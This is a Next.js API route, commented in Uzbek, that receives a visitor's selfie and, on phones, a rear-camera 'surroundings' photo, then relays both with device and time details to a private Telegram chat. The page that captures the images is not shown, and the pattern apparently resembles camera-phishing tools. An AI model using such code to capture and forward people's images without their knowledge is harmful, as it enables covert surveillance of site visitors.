// pages/api/sendimg.js
import formidable from "formidable";
import fs from "fs";
import fetch from "node-fetch"; // npm install node-fetch@2

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export const config = {
  api: {
    bodyParser: false,
  },
};

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Faqat POST" });
  }

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("ENV o'zgaruvchilari yo'q");
    return res.status(500).json({ error: "Server konfiguratsiyasi xatosi" });
  }

  const form = formidable({ multiples: true });

  try {
    const [fields, files] = await form.parse(req);

    const selfieFile = files.selfie?.[0];
    const environmentFile = files.environment?.[0];
    const device = fields.device?.[0] || "noma'lum";

    if (!selfieFile) {
      return res.status(400).json({ error: "Selfie topilmadi" });
    }

    const time = new Date().toLocaleString("uz-UZ");

    // Bitta rasm yuborish funksiyasi
    const sendPhoto = async (filePath, caption = "") => {
      // Faylni Buffer ga o'qiymiz
      const buffer = fs.readFileSync(filePath);

      // Buffer dan Blob yaratamiz
      const blob = new Blob([buffer], { type: "image/jpeg" });

      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "photo.jpg");
      if (caption) formData.append("caption", caption);

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      });

      const result = await response.json();

      if (!result.ok) {
        console.error("Telegram xatosi:", result);
        throw new Error(result.description || "Yuborishda xatolik");
      }

      console.log("Yuborildi:", caption || "Selfie");
    };

    // Selfie yuboramiz
    let mainCaption = `Saytdan rasm! 📸\nVaqt: ${time}\nQurilma: ${device === "mobile" ? "Telefon" : "Kompyuter"}`;

    if (environmentFile) {
      mainCaption += "\nQuyida atrofdagi surat ham bor";
    }

    await sendPhoto(selfieFile.filepath, mainCaption);

    // Agar telefon bo'lsa — orqa kameradan ham yuboramiz (teng emas, ketma-ket)
    if (environmentFile) {
      await sendPhoto(environmentFile.filepath, "Atrof 🌍");
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error("Server xatosi:", error);
    return res.status(500).json({ error: "Server xatosi: " + error.message });
  }
}